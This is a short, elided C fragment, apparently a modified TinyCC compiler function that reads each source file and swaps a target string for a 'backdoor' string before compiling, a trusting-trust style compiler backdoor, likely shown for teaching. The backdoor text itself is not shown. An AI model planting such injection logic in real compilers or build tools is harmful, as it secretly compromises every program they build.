...
ST_FUNC int tcc_add_file_internal(TCCState *s1, const char *filename, int flags)
{
    ...
    // REad the entire source file manually
    FILE *fp = fdopen(fd, "r");
    ...
    // Create a buffer to contain the source file as a string
    ...
    // Define the target and the backdoor to be inserted
    ...
    // by character
    while (*s) {
        // We found the target - replace it and advance buffer pinters
        if (strncmp(s, target, target_len) == 0) {
            memcpy(d, backdoor, replace_len);
            d += replace_len;
            s += target_len;
        }
        // Just copy a single character 
        else {
            *d = *s;
            d++;
            s++;
